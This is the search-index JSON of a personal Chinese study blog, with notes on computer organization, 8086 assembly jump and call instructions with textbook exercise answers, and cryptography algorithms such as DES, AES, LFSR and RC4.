{"meta":{"title":"JxXxX","subtitle":"是个人","description":"一个想好好学习的gamer","author":"JxXxX","url":"https://c4stle.github.io","root":"/"},"pages":[{"title":"About Me❤","date":"2020-03-08T01:05:34.000Z","updated":"2022-03-07T06:37:55.791Z","comments":true,"path":"about/index.html","permalink":"https://c4stle.github.io/about/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-03-08T11:42:02.000Z","updated":"2020-03-10T10:05:30.257Z","comments":true,"path":"categories/index.html","permalink":"https://c4stle.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-03-08T05:24:45.000Z","updated":"2020-03-10T10:06:00.202Z","comments":true,"path":"tags/index.html","permalink":"https://c4stle.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"摸鱼的第一天","slug":"摸鱼的第一天","date":"2022-03-07T06:41:18.853Z","updated":"2022-03-07T06:41:18.853Z","comments":true,"path":"2022/03/07/摸鱼的第一天/","link":"","permalink":"https://c4stle.github.io/2022/03/07/%E6%91%B8%E9%B1%BC%E7%9A%84%E7%AC%AC%E4%B8%80%E5%A4%A9/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"计算机中进制换算","slug":"计算机里的进制转换","date":"2020-10-01T11:42:20.156Z","updated":"2020-05-15T11:51:30.806Z","comments":true,"path":"2020/10/01/计算机里的进制转换/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%87%8C%E7%9A%84%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/","excerpt":"","text":"1 bit = 1 位二进制 4 bit = 1 位十六进制 8 bit = 2 位16进制= 1 B（字节） 一个英文字符 = 1 字节 一个中文字符 = 2 字节 汇编里 1 word （字）= 2 B字节= 4 位16进制 一个字分高字节、低字节 4个db = 2个dw = 1个dd = 4个字节 = 2个字 = 8 位16进制","categories":[],"tags":[{"name":"学习，备忘","slug":"学习，备忘","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%A4%87%E5%BF%98/"}]},{"title":"密码学_笔记备忘_数字签名","slug":"密码学_笔记备忘_数字签名","date":"2020-10-01T11:42:20.140Z","updated":"2020-05-09T07:55:53.556Z","comments":true,"path":"2020/10/01/密码学_笔记备忘_数字签名/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E5%AF%86%E7%A0%81%E5%AD%A6_%E7%AC%94%E8%AE%B0%E5%A4%87%E5%BF%98_%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/","excerpt":"","text":"数字签名","categories":[],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://c4stle.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"学习","slug":"学习","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"数字签名","slug":"数字签名","permalink":"https://c4stle.github.io/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"}]},{"title":"计算机组成原理","slug":"计算机组成原理","date":"2020-10-01T11:42:20.140Z","updated":"2020-05-06T14:39:41.803Z","comments":true,"path":"2020/10/01/计算机组成原理/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","excerpt":"","text":"计算机组成原理 存储器 主存中存储单元地址的分配 一、主存储器如何存储数据？ ​ 计算机中，八位(bit)是一个字节(Byte)，16位就是两个字节，32位就是四个字节。 ​ 在存储一个数据，例如12345678H这个数据的时候。 ​ 计算机当中存的都是二进制，所以八个16进制数，用二进制表示就是32位，也就是存放四个字节的地址！ 高位字节地址为字地址(大端、大尾方式) 低位字节地址为字地址(小端、小尾方式) 二、主存储器当中如何按字节寻址 ​ 设地址线有24根，如果按字节寻址(每一个字节(8bit)都是一个地址) ，访问的范围就是$2^{24}$ = 16MB。 ​ 如果是按字寻址：(一根地址线可以用0、1来区分地址。两根可以区分$2^2$ = 4个地址) 字长为16位时，16位就是 2 个 8 bit，2个字节，需要一根地址线来区分两个字节的地址，所以寻址范围是 $2^{24-1}$ = 8MW（W是word的缩写） 字长为32位是，是四个字节，需要两根地址线来区分四个字节的地址，所以寻址范围是$2^{22}$ = 4MW 题：一个按16K × 32位的存储器，其地址线和数据线的总和是(46) ​ 容量16K，说明地址线有 ($2^{14}$ = 16KB)14根，字长由数据线数量决定，一根数据线就是1位字长，所以数据线有32根。 14 + 32 = 46根总共。 半导体存储芯片 半导体存储芯片的基本结构 半导体芯片的容量 ​ 半导体芯片的容量由地址线(单向，进行编址，看图)和数据线(双向，读/写，看图)组成 ​ 10根地址线 和 4根数据线 组成的芯片容量表示成 1K($2^{10}$) × 4位。 ​ 十根地址总线表示：如果对存储矩阵中的存储单元进行编址的话，需要10位的二进制数，能够编址的个数(范围)就在00 0000 0000~11 1111 1111共有$2^{10}$Byte = 1KB ​ 4根数据线表示：每个存储单元最多存储4个二进制数。 不懂就问：8个二进制数占1一个字节，怎么理解10位二进制是1KB？ ​ 两个不同概念，一个是存储时的容量大小，一个是编址时的范围。10位二进制可以表示$2^{10}$也就是1024个不同的数据的地址，每个地址可容纳数据的大小为一个字节(Byte.) 片选线 ​ 片选线有CS(chip select芯片选择)、CE(chip enable芯片使能)两种，一般是CS。 ​ 片选线用来选择访问的信息存在于哪个/哪几个芯片当中，找到之后输入电信号激活芯片。 一般表示高电平有效，如果在符号上有一横，则表示低电平有效 读/写控制线 ​ 用来决定对存储器的操作时读还是写。 只有一根线WE时，就是下图中上方的情况，两根线的时候就是下图中下方的情况 用多少片的16K×1位的存储芯片可以组成64K × 8位的存储器？ $$ \\frac{(64K × 8)}{(16K × 1)} = 4K × 8 = 32 $$ 半导体存储芯片的译码驱动方式 线选法 A0~A3是四根导线，控制着16($2^4$)根地址线，经过地址译码器，选出一根线，之后对上面的某个或多个单元进行读写操作 D0~D7是控制读写的电路，有8个说明大小是八，所以这是个16B × 8的存储器。从中选择一根对对应的地址线上的单元进行读/写操作。 重合法 行列地址，确定一个固定的地址单元，进行I/O操作 随机存取存储器(RAM) 静态RAM(SRAM) 存储元件如何保存0和1？原理是什么？ ​ 可以用开关、熔丝的连接和断开(易断难连) 基本单元电路(保存、读、写)的构成是什么？ 对单元电路如何读出和写入？ 典型芯片结构是什么样子的？ 静态RAM芯片的如何进行读出和写入？ 只读存储器(ROM) 早期的只读存储器——厂商写好了内容——掩模ROM(MROM) ​ 改进1. 用户可以自己写——一次性——PROM(一次性编程) ​ 改进2. 可以多次写——要能对信息进行擦除——EPROM(多次性编程) ​ 改进3. 电可擦写——需要特定设备——EEPROM(多次性编程) ​ 改进4. 电可擦写——直接连接到计算机上——FLASH memory(闪速型存储器) CPU和存储器的连接 存储器容量的扩展 (1)**位扩展（**增加存储字长） 2片1K × 4 的存储芯片组成一个 1K × 8的存储器 (2)字扩展（增加存储字的数量） 2片1K × 8 的存储芯片组成一个 2K × 8的存储器，不能同时工作 (3)字、位同时扩展 8片1K × 4 存储的芯片组成4K × 8的存储器 ​ ​","categories":[],"tags":[{"name":"学习","slug":"学习","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"计算机组成原理","slug":"计算机组成原理","permalink":"https://c4stle.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"}]},{"title":"汇编语言（王爽老师）笔记","slug":"汇编语言笔记","date":"2020-10-01T11:42:20.140Z","updated":"2020-05-15T14:25:22.098Z","comments":true,"path":"2020/10/01/汇编语言笔记/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/","excerpt":"","text":"9. 转移指令 8086CPU的转移指令分类 无条件转移指令：如jmp 条件转移指令 循环指令：如loop 过程：函数 中断： Codemov ax,4c00Hint 21H其实起作用的就是 AH&#x3D;4CH，意思就是调用 INT 21H 的 4CH 号中断，该中断就是安全退出程序。其实这句等价于MOV AH,4CHINT 21H 一、转移指令的原理 操作符offset offset在汇编语言中由编译器处理，功能是 “取得标号的偏移地址” Codeassume cs:codesgcodesg segment start: mov ax,offset start ;相当于mov ax，0 因为start是从0开始的偏移地址是0 s: mov ax, offset s ;相当于mov ax，3 因为上一句的机器码占了0，1，2三字节，所以s从3开始codesg endsend start 练习：填写两条指令，是程序在运行中将s处的指令复制到s0处（nop机器码占一个字节） Codeassume cs:codesgcodesg segment s: mov ax,bx ;mov ax,bx的机器码占两个字节 mov si,offset s ; 看思考 mov di,offset s0 ; 看思考 ?????? ;mov ax,cs:[si] ?????? ;mov cs:[di],ax s0: nop nop codesg ends end s 思考：用offset复制数据前的思考 ​ (1). 首先思考s和s0处指令所在的内存单元的地址，因为在codesg segment，所以单元地址格式应该为cs:[ip]。ip指偏移地址，所以s和s0出的内存单元地址为： cs:offset s、cs:offset s0 ​ (2). 将s处的指令复制到s0处，就是将cs:offset s处的数据复制到cs:offset s0处； ​ (3). 代码段段地址已知在cs中，s和s0的偏移地址分别被送到了si和di中； ​ (4). 要复制的数据占多少空间？mov ax,bx的机器码占两个字节，即一个字，刚好对应了s0中的两个nop 结论：怕后面找不到了先写在这 mov ax,cs:[si]这句话，只会传从那个地址开始的两个字节数，为什么？如果传的是一个可执行的机器码，比如8B C3，那么接下来到了s0就会执行，如果不是就RET RET完了竟然还执行了mov ax，bx，神奇？！ 因为寄存器只能放两个字节！SB！ 结论：我是猪。 因为cs:[di]是s0的指令数据的首地址，cs:[si]存的是s的指令数据的首地址 然后cs:[si]的指令数据存到了ax中，然后ax的指令数据又存入了cs:[di]中，但是因为只有两个字节的空间，所以就传了mov ax，bx刚好两个字节 nop机器码是90哈哈哈哈 可以看到只改变了两个字节，并没有继续往后改变 如果只有一个nop是不是只会传8B呢？又或者有很多nop会不会全都能传进来呢？ 1） 如果只有一个nop，仍然会把mov ax，bx传进去。 2）如果有很多nop，也只会占mov ax，bx jmp指令 jmp为无条件转移，可以只修改IP，也可以同时修改CS和IP。 jmp指令要给出两种信息： ​ 转移的目的地址 ​ 转移的距离(段间转移、段内短转移，段内近转移) jmp指令用法 段内短转移、段内近转移 用法： jmp short 标号 对IP的修改范围为-128~127，向前最多128字节(负)，向后最多127个字节(正) 比如： Codeassume codesgcodesg segment start: mov ax,0 jmp short s ;跳到s处继续执行。那为什么写add ax,1呢？又不执行。 因为后面可能会跳回来，执行add ax,1 add ax,1 s: inc ax ;等于 add ax,1codesg endsend start 越过了add ax,1，直接执行了inc ax，所以整个过程中ax只加了1次。 汇编指令与机器码的对应实例 我们查看一下上述程序中jmp指令的对应机器码 s的偏移地址是0008这是没有问题的，但是机器码里没有0008这个idata(立即数)，取而代之的是EB03？ 为了证明这个EB03是什么，我们在add ax,1后面再加一个add ax,1，然后查看-u查看一下指令和机器码对应。 变成了EB06！！！！ 通过对比我们发现，jmp指令和s中间隔了两个add指令，而add ax,0001占了三个字节，两个则占了六个字节，刚好与03、06对应。 要注意的是：jmp指令本身占两个字节，所以是当前偏移地址+jmp指令占的字节，然后再对跳转的目标地址进行相对偏移计算 那么结论就是：CPU不需要目的地址也可以实现对IP的修改，转移指令EB03没有告诉CPU转移的目的地址，而是告诉了要转移的位移量是多少 那么如果要jmp的目标在偏移地址在jmp前面怎么办呢？？？？ 为什么是EBF7？F7从哪来的？？ 我们先算一下jmp short s和s中间差了多少个偏移量？查了9个偏移量，准确来说是负9，但是负数我们没法在机器中表示，所以引入了一个补码的概念。 Code-9对应了正数9，二进制就是（0000 1001），然后所有位取反，变成了二进制（1111 0110），之后再+1（负数的补码才需要+1，正数直接取反即可），变成了二进制（1111 0111），对应了十六进制的（F 7）。 因为四位二进制表示一位十六进制，1111表示F，0111表示7。 所以-9在机器码中表示位F7 下面是截自书上的内容(段内近转移 jmp near ptr 标号) 段间转移 用法： jmp far ptr 标号 Codeassume cs:codesgcodesg segment start: mov ax,0 mov bx,0 jmp far ptr s db 256 dup(0) ; 256个字节型数据，值都是0 s: add ax,1 inc axcodesg endsend start 可以看到后面变成了cs:ip的形式。导致这整个机器码占了5个字节！ 转移地址在寄存器中的jmp指令 用法：jmp 16位寄存器 结果就是 ip变成了16位寄存器的偏移地址，从理论上 jmp ax = mov IP,ax。但是后者会报错。 转移地址在内存中的jmp指令 用法： jmp word ptr 内存单元地址(段内转移) 会读取从内存单元开始的一个字，也就是两个字节 Codemov ax,0123hmov ds:[0],axjmp word ptr ds:[0] ;结果就是ip&#x3D;0123h---------------------------------------mov ax,0123hmov [bx],axjmp word ptr [bx] ;结果一样ip&#x3D;0123h 用法： jmp dword ptr 内存单元地址(段间转移) 会读取从内存单元开始的两个字，高地址处作为目的端地址，低地址处作为转移目的偏移地址 CS = 内存单元地址+2 IP = 内存单元地址 Codemov ax,0123hmov ds:[0],axmov word ptr ds:[2],0 ;ds开始的地址上存的数据为 2301 0000;jmp dword ptr ds:[0] ; cs &#x3D; 0 ip &#x3D; 0123h Codemov ax,0123hmov [bx],axmov word ptr [bx+2],0 ;同上jmp dword ptr [bx] 检测点9.1 若要使程序中的jmp指令执行后，CS:IP指向程序的第一条指令，在data段中应该定义哪些数据？ Codeassume cs:codesgdata segment ___________ ; dw 0，0即可, ;因为下面jmp指令是word，字型 ;由前面学习可知，会从ds:[bx+1]开始读取，bx&#x3D;0，就是从ds:[1]开始，只给[0]、[1]上变成0显然不够，需要把[2]也变成0. ;当然如果你直接dd 0也可以，一下变了0~3个内存空间为0data endscodesg segment start: mov ax,data mov ds,ax mov bx,0 jmp word ptr [bx+1]codesg endsend start 检测点9.2： 补全程序，使jmp指令执行后，CS:IP指向程序的第一条指令。 Codeassume cs:codedata segment dd 12345678H ;看的时候可以拆开来看，1234 5678 存进去就变成了 3412 7856data endscode segmentstart: mov ax, data mov ds, ax mov bx, 0 ;想办法把3412 7856变成0000 0000就对了！ ; 乍一看我想都填0的，但是这样是错误的，你可以mov bx,0 但你不能mov [bx],0. mov [bx], ____ ;我们知道，jmp dword之后，CS&#x3D; 内存单元地址+2， ip &#x3D; 内存单元地址 我们的目的就是把ds上的前四个地址变成 ip:CS 这是关键！ ;[bx]现在代表0、1两格的内存地址，用寄存器bx给他传0就完事了。这样，ds:[0]对应的两个字节就变成了0。 mov [bx + 2], ____ ;[bx+2]现在代表的是2、3两格内存地址，变成CS就完事了。 jmp dword ptr ds:[0]code endsend start 检测点9.3 用Debug查看内存，结果如下： 2000:1000 BE 00 06 00 00 00 … 则此时，CPU执行指令： Codemov ax, 2000Hmov es, axjmp dword ptr es:[1000H] 后，(CS)=0006，(IP)=00BE，简单题嗷 jcxz指令 有条件跳转指令，所有的有条件跳转指令都是短转移，在对应的机器码中转移的位移，而不是目的地址。对IP的修改范围也都在-128~127（跟jmp short的范围一样） jcxz和loop一样都看CX的值 用法：jcxz 标号 如果CX=0，则转移到标号处执行 如果CX不等于0，什么也不做，程序继续执行。 jcxz等价于 cif（CX == 0） jmp short 标号； 检测点： 补全变成，利用jcxz指令，实现内存2000H段中查找第一个值为0的字节，找到后，将他的偏移地址存储在dx中 Codeassume cs:codesgcodesg segment start:mov ax,2000H mov ds,ax mov bx,0 s:_______ ;mov ax,ds:[bx]错的，mov cl,[bx] _______ ;mov ch,0 _______ ;jcxz ok _______ ;inc bx jmp short s ok:mov dx,bx mov ax,4c00h int 21h code endsend start 我写的前两步是错的，因为题目当中说查找的是一个字节。所以应该把CX分为CH和CL 网上搜到的答案都是将ds:[bx] 给 cl，但是我觉得给ch也没问题，只要保证另一个位是0即可 因为CX是有初始值的，所以帮ds:[bx]赋值的时候，另一个是要清0的，但是清一次就够了，所以我觉得就对本题来说，换在循环里有点多此一举 loop指令 loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址，IP修改的范围也是-128~127 用法：loop 标号 执行loop前，会先执行CX = CX - 1 ，然后判断CX是否等于0，等于0，向下执行；不等于0，进循环 ccx--if(cx != 0) jmp short s 检测点9.3 补全编程，利用loop指令，实现在内存的2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存储在dx中。 Codeassume cs:codecode segmentstart: mov ax, 2000H mov ds, ax mov bx, 0s: mov cl, [bx] mov ch, 0 _________ ;inc CX 因为如果找到了，CX&#x3D;0，在执行loop的时候会先-1，CX值变成了FFFFh，就出事了 inc bx loop sok: dec bx ;dec指令的功能和inc相反，dec bx &#x3D; bx-- mov dx, bx mov ax, 4c00h int 21hcode endsend start EZ boys！ 根据位移转移指令的意义 比如loop s，在机器码里是写的s处的位移。如果用的是s的目的地址，说不定会出错，因为如果s处的指令不在目的地址，那程序就会出错。用位移量就不会。 一个奇怪的程序 运行程序前，你觉得它能正常结束吗？ Codeassume cs:codesgcodesg segment mov ax,4c00h int 21h start: mov ax,0 s: nop nop mov di,offset s mov si,offset s2 mov ax,cs:[si] mov cs:[di],ax s0: jmp short s s1: mov ax,0 int 21h mov ax,0 s2: jmp short s1 nop codesg endsend start jmp short s的机器码是不会变的。原本是多少个位移，将命令放到另一个位置，还是跳多少个位置 10. call和ret指令 call和ret指令都是转移指令，都可以修改IP或同时修改CS和IP ret和retf **ret**指令用栈中的数据，修改IP的内容，从而实现近转移！ 用法：单ret即可 执行ret指令时候，进行的操作： IP = ( (ss)*16 + (sp) ) ；栈顶的地址给IP sp = sp + 2 ； 栈顶后移 相当于 Codepop IP **retf**指令用栈中的数据，修改CS和IP，从而实现远转移！ 用法：单retf即可 执行retf指令时，进行的操作： IP = ( (ss)*16 + (sp) ) ；栈顶地址给IP sp = sp + 2 ； 栈顶后移 CS = ( (ss)*16 + (sp) ) ； 当前栈顶地址给CS sp = sp + 2 ； 栈顶后移 Codepop IPpop CS 检测点10.1 补全程序，实现从内存1000:0000处开始执行指令 Codeassume cs:codestack segment db 16 dup (0)stack endscode segment start: mov ax,stack mov ss,ax mov sp,16 mov ax,_______ ;1000 push ax mov ax,_______ ;0000 push ax retfcode endsend start 因为先出栈的是IP，所以要后入栈。 call指令 call指令经常跟ret指令配合使用，因此CPU执行call指令，进行两步操作： （1）将当前的IP或CS和IP压入栈中； （2）转移（jmp） 用法： call 标号 sp = sp - 2 ( (ss)*16 + (sp) ) = IP IP = IP + 16位的位移地址 16位位移 = 标号处的地址 - call 指令后的第一个字节的地址，-32768~32767，补码表示。跟jmp差不多，编译器算的地址。 call指令相当于 Codepush IPjmp near ptr 标号 检测点10.2 下面程序执行后，ax中的数值为多少 内存地址 机器码 汇编指令 1000:0 b8 00 00 mov ax,0 1000:3 e8 01 00 call s 1000:6 40 inc ax 1000:7 58 s: pop ax ax数值为6，因为读取call s的过程中，IP先增加指向了一条指令，然后才执行当前指令。 转移目的地址在指令中的call指令 用法：call far ptr 标号，将当前CS、IP入栈 CPU执行时进行的操作 sp = sp - 2 ( (ss)*16 + (sp) ) = CS sp = sp - 2 ( (ss)*16 + (sp) ) = IP CS = 标号所在段地址； IP = 标号所在偏移地址 call far ptr 相当于 Codepush CSpush IPjmp far ptr 标号 检测点10.3 下面程序执行后，ax中的数值为多少？ 内存地址 机器码 汇编指令 1000:0 b8 00 00 mov ax,0 1000:3 9A 09 00 00 10 call far ptr s 1000:8 40 inc ax 1000:9 58 s: pop ax add ax,ax pop bx add,ax,bx ax = 1010h add ax，ax = 8+8 = 10！ 转移地址在寄存器中的call指令 用法：call 16位寄存器 16位寄存器刚好放4个16进制数，直接给IP了 sp = sp - 2 ( (ss)*16 + (sp) ) = IP IP = 16位寄存器（reg） 相当于 Codepush IPjmp 16位寄存器 检测点10.4 下面程序执行后，ax中的数值为多少？ 内存地址 机器码 汇编指令 1000:0 b8 06 00 mov ax,6 1000:3 ff d0 call ax 1000:5 40 inc ax 1000:6 mov bp,sp add ax,[bp] call ax执行后，IP = 6，ax = 6，然后直接跳转到1000:6，sp就是IP入栈的地址，bp = sp，入栈时的IP = 5，所以结果时06+05 = 0B 转移地址在内存中的call指令 1.只改变IP 用法：call word ptr 内存单元地址 Codemov sp,10hmov ax,0123hmov ds:[0],axcall word ptr ds:[0] 执行结果为，IP = 0123H，sp = sp - 2 = 10 - 2 = 0E 相当于 Codepush IPjmp word ptr 内存单元地址 2.同时改变CS、IP 用法：call dword ptr 内存单元地址 Codemov sp,10hmov ax,0123hmov ds:[0],axmov word ptr ds:[2],0call dword ptr ds:[0] 执行结果，CS = 0，IP = 0123H，SP = 0CH 可以看到 高位给CS，低位给IP 相当于 Codepush CSpush IPjmp dword ptr 内存单元地址 检测点10.5 （1）下面的程序执行后，ax中的数值为多少？（注意：用call指令的原理来分析，不要再Debug中单步跟踪来验证你的结论。对于此程序，Debug中单步跟踪的结果，不能代表CPU的实际执行结果） Codeassume cs:codestack segment dw 8 dup(0) ; 00h 00h~0Fhstack endscode segment start:mov ax,stack mov ss,ax mov sp,16 ;指向栈底10H，存的时候存在0E、0F mov ds,ax mov ax,0 call word ptr ds:[0EH] ;call word 只存下一条指令的IP，存放在0F、0E。 ;call word只取ds:[0EH]里面存的的IP，CS还是那个CS inc ax inc ax inc ax mov ax,4c00h int 21hcode endsend start ax = 3 （2）下面程序执行后，ax和bx中的数值为多少？ Codeassume cs:codesgdata segment dw 8 dup (0) ;0010H 00H~0FHdata endscode segmentstart: mov ax,data mov ss,ax mov sp,16 mov word ptr ss:[0],offset s ;ss:[0~1]存了s的偏移地址，当成word:2个字节数据来存 mov ss:[2],cs ;ss:[2]存了代码段的地址 call dword ptr ss:[0] ;先存下一条CS:IP ;ss:[0CH~0DH] &#x3D; IP（指向nop） SS:[0EH~0FH] &#x3D; CS ;跳转到s nop ;nop占1个字节s: mov ax,offset s sub ax,ss:[0ch] ;ax当前存是s段的偏移地址，0ch存的是nop的偏移地址，只相差1; mov bx,cs sub bx,ss:[0eh] mov ax,4c00h int 21hcode endsend start ax = 1， bx = 0 call和ret的配合使用 问题10.1 程序返回前，bx中的值是多少？ Codeassume cs:codecode segmentstart: mov ax,1 mov cx,3 call s mov bx,ax mov ax,4c00h int 21h s: add ax,ax loop s ret ;pop IPcode endsend start bx = 8 可以用来计算2的n次方，n = cx","categories":[],"tags":[{"name":"学习","slug":"学习","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://c4stle.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}]},{"title":"密码学_笔记备忘_分组密码","slug":"密码学_笔记备忘_分组密码","date":"2020-10-01T11:42:20.124Z","updated":"2020-04-28T01:59:15.187Z","comments":true,"path":"2020/10/01/密码学_笔记备忘_分组密码/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E5%AF%86%E7%A0%81%E5%AD%A6_%E7%AC%94%E8%AE%B0%E5%A4%87%E5%BF%98_%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/","excerpt":"","text":"DES算法 初始置换 输入64比特的表M：数字代表输入顺序 给出两张置换表，分别是初始置换IP和逆初始置换$IP^{-1}$两张表是固定的 初始置换的意思是，把第58个输入的放在第1位，第50个输入的放在第2位…第7位输入的放在最后。得到结果X 逆初始就是把现在X中的40位放在第1位，第8位放在第2位，我们顺着找一下，可以发现全部带进去之后就变回了M。也就是 轮结构 首先看一下整个轮结构，之后再来分开看。 一、 先看左半边，输入的64比特的轮分为L和R，各32比特。每轮(一般16轮)变换可以用如下公式表示： 二、 然后重点看中间由虚线框起来的函数F(R,K)，具体看下图 R的32比特经过扩展置换(E表)变成48bit，主要过程如下图，左右各新增一列，左列由原来第一列减去1得到，右边由原来第四列+1得到。(要注意1 - 1变成32，而32 + 1变成 1) R变成48bit后，和右边生成的48bit得密钥(密钥如何产生的在下面会说)进行⊕运算，(只有两个变量不相同，才输出1) 异或计算后，是一个只有0和1(二进制表)的48bit表，应该不难想象~ 之后这48比特被分成8组，每组就是6比特，要经过8个S盒，变成8组4比特。其中的过程如下： (1). 比如进来的数字是101100，进的是S1盒 (2). 将最高位、最低位取出，是二进制10，对应的十进制是2。所以说是锁定第2行(注意行和列是从0开始的) (3). 剩下中间的四个二进制是0110，对应的十进制是6，所以是第六列。 (4). 去除第二行第六列的数字是2，对应的二进制是0010 (5). 这样就成功的将6比特的101100转换成4比特的0010 。 从S盒出来后，还要经过P盒的置换，置换后的32比特即为函数F(R,K)的输出，置换过程如初始置换一样。S盒，P盒都是固定的 下图截自学校正在上的网课。。 密钥的产生 密钥最开始也是64位，不过在进行第一次置换(置换后变成56比特)前，要去掉8,16,24,32,40,48,56,64这八个校验位。 剩下的56比特进行第一次置换选择，八行七列 将置换后的56比特，切开分成$C_0$和$D_0$，分别是28比特，之后进行循环左移(16轮)第一位左移变成最后一位 最后再合并进行第二次置换选择这样就得到了最后的密钥K 不是总结的总结🤷‍♂️ 传进来的时候已经是64比特的二进制。 轮结构重复了16遍，$R_{i-1}$在进函数F(R,K)前已经赋值给$L_i$，$L_{i-1}$在最后跟函数F的值进行⊕后赋值给$R_i$ 密钥的生成，在第二次置换选择前就赋值给了$C_i$、$D_i$ 走完16遍后要进行逆初始置换$IP^{-1}$，才能得到64比特的密文！ AES算法 AES算法中关于xtime(x)的运算 定义：xtime(x)定义为GF(2)上的x*bx。 运算过程 首先看x，拿57 举例，这不是五十七，在AES里要看成是 0101(5) 0111(7)，用二进制表示的16进制数(可能有歧义？？ 01100111从前往后分别记作$b_7$、$b_6$、$b_5$…$b_0$ 看$b_7$，是0的话，所以把结果往左移一位，并且补上0。 若$b_7$是1，则把结果二左移一位，并且补0，再与1B(0001 1011)做逐步异或。 57是0101 0111，$b_7$=0 所以xtime(57) = 1010 1110(A E) AE是1010 1110，$b_7$=1 所以xtime(AE) = 0101 1100 ⊕ 0001 1011 = 0100 0111(47) xtime(x)的例子 例如57 * 13 要怎么算ps：08 * 2 等于 16，但是是16进制，变成了10 57 * 02 = xtime(57) = AE 57 * 04 = xtime(AE) = 47 57 * 08 = xtime(47) = 8E 57 * 10 = xtime(8E) = 07 所以57 * 13 = 57 * (01 ⊕ 02 ⊕ 03) = 57 ⊕ AE ⊕ 07 = FE AES加密轮函数 字节代换 行移位 列混合 密钥加 SM4加密算法 数据分组长度128bit，密钥分组长度128bit，加密算法和密钥扩展算法都是32轮贴袋结构，以字节(8位)和字(32位)为单位进行数据处理 LSFR线性反馈移位寄存器(非线性序列在流密码中) 看懂这个表， 开始输入了101，分别给a1 a2 a3，输出a1 第一轮f计算出值是1*0异或1 = 1 a2值给a1，a3值给a2，a4值给a3一直往后到n，例子里只到a3给a2 f的值给a3。到此，每个数字都有了新的值，下标最大的a得到上一轮f的值。 此时 a1~a3的值分别为 0 1 1；输出a1 进入第二轮，f的值为1*0 异或1 =1 a1获得上一轮结束时a2的值 1，a2获得上一轮结束时a3的值1，a3得到本轮f的值1 ，输出a1 第三轮… 这玩意有周期的，小于等于 $2^n$ - 1 若产生周期刚好是$2^n$ - 1，则成该序列为n级最大周期LFSR序列，简称 m-序列 该LFSR称为最长LFSR。 B-M算法 一直一个序列S，如何构造一个尽可能短的LFSR来产生S B-M算法如下： 输入：N，$S_0$，$S_1$，$S_2$，…，$S_{N-1}$ 输出：&lt;$f_n$(x)，$l_n$&gt; n= 0,1,2,3…N-1 原理 f(D)$a_k$ = 0(k&gt;=n) 初始化，$f_0$(x) = 1， $l_0$ = 0 计算$d_n$ = $f_n$()$s_n$ 当$d_n$ = 0时，则另&lt;$f_n+1$(x)，$l_n+1$&gt; = &lt;$f_n$(x)，$l_n$&gt;，到第三步 当$d_n$ = 1，且 $l_0$ = $l_1$ = … = $l_n$ =0时，则令&lt;$f_n+1$(x)，$l_n+1$&gt; = &lt;1+$x^{n+1}$，n+1&gt; 当$d_n$ = 1，且 $l_m$ &lt; $l_{m+1}$ = $l_{m+2}$ = … = $l_n$，则 然后到到第三步 若n &lt; N-1，则 n = n+1，回到第二步；否则输出&lt;$f_n$(x)，$l_n$&gt; 定理：使用B-M算法，以N长二元序列S位输入，得到输出&lt;$f_n$(x)，$l_n$&gt;，则 Geffe序列生成器 由三个LFSR组成，其中LFSR2作为控制生成器使用 当LFSR2输出1时，LFSR2与LFSR1相连接，整个Geffe输出LSFR1 当LFSR2输出0时，LFSR2与LFSR3相连接，整个Geffe输出LSFR3 钟控生成器 LSFR输出为1时，2被驱动，3为被驱动，重复输出上一步的输出比特。即LSFR1为1010…时,2和3交错生效 RC4 使用广泛(SSL/TLS协议，WEP协议) 密钥长度可变，面向字节操作 用置换加密(异或)输入消息，每次一个字节 至少采用128比特的密钥 密钥调度算法 伪随机子密码生成算法 密钥调度算法 ​ 有密钥流决定的一个0~255的置换 ​ 初始化时，状态矢量S被设置为0到255，即S[0]=1，S[1]=1，…，S[255] = 255 ​ 种子密钥K为L个字节,循环填充到状态矢量T的256字节中 伪代码: 伪随机子密码生成算法 XOR 异或","categories":[],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://c4stle.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"DES","slug":"DES","permalink":"https://c4stle.github.io/tags/DES/"},{"name":"学习","slug":"学习","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"密码学_笔记备忘_公钥密码","slug":"密码学_笔记备忘_公钥密码","date":"2020-10-01T11:42:20.124Z","updated":"2020-05-10T13:46:16.053Z","comments":true,"path":"2020/10/01/密码学_笔记备忘_公钥密码/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E5%AF%86%E7%A0%81%E5%AD%A6_%E7%AC%94%E8%AE%B0%E5%A4%87%E5%BF%98_%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81/","excerpt":"","text":"公钥密码(非对称加密) 公钥密码的提出 密钥分配 问题 